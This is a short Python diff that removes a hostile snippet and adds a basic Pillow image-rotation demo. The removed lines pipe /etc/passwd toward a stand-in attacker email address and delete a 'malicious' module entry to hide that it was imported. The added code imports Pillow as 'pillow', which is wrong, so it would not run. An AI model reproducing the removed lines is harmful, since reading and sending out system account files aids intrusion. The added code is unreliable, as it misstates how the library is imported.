@@ -1,5 +1,13 @@
 import os
 import sys
 
-os.system('cat /etc/passwd | attackers-email@example.com')
-del sys.modules['malicious']  # pretend it's not imported
+import pillow
+
+from pillow import Image
+#Open image using Image module
+im = Image.open("images/cuba.jpg")
+#Show actual Image
+im.show()
+#Show rotated Image
+im = im.rotate(45)
+im.show()
